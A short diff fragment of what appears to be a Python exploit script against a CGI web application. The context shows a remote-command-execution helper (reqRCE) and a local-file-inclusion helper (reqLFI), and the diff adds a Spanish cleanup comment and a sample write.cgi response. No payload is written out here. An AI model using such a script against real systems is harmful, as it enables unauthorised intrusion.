@@ -101,8 +101,10 @@ def reqRCE(xCookie, xCommand):
 
 testReq = reqRCE(cookie, cmd)
 
-
+# limpiar esto !!
 print Colors.BLUE+testReq+Colors.DEFAULT
+# <html><head><title>Untitled</title></head><body>write.cgi completed.</body></html>
+
 
 
 def reqLFI(hst):#, port):
